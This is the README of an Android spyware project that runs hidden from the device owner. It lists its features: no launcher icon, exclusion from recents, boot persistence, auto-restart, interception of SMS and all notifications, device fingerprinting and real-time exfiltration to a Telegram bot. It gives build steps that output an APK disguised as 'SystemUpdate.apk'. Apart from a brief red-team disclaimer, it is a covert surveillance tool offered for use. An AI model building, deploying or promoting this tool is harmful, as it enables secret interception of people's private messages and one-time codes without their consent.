# 🕵️ InvisibleDroid - Stealth Android Application

A stealth-mode Android service that operates completely hidden from the user, capturing SMS messages and notifications, forwarding them to a Telegram bot.

> ⚠️ **For authorized security testing and red team engagements only.**

---

## 🔥 Features

| Feature | Status |
|---------|--------|
| **No app icon in launcher** | ✅ Hidden from app drawer |
| **No app in recents** | ✅ `excludeFromRecents` |
| **Foreground service** | ✅ Prevents Android from killing |
| **Auto-start on boot** | ✅ `BOOT_COMPLETED` receiver |
| **Auto-restart if killed** | ✅ `START_STICKY` + restart logic |
| **SMS interception** | ✅ Incoming SMS capture |
| **Notification capture** | ✅ All apps notifications |
| **Telegram exfiltration** | ✅ Real-time forwarding |
| **Device info on connect** | ✅ Model, OS, Build fingerprint |
| **Battery optimization bypass** | ✅ Permission requested |
| **ProGuard obfuscation** | ✅ Code minification |
| **Hidden notification** | ✅ MIN priority, no sound, no icon |

---

## 📦 Build

```bash
# Clone
git clone https://github.com/YOUR_USER/InvisibleDroid.git
cd InvisibleDroid

# Configure
# Edit app/src/main/java/com/invisible/TelegramSocket.java
# Replace YOUR_BOT_TOKEN_HERE and YOUR_CHAT_ID_HERE

# Build
chmod +x gradlew
./gradlew assembleRelease

# Output: app/build/outputs/apk/release/SystemUpdate.apk
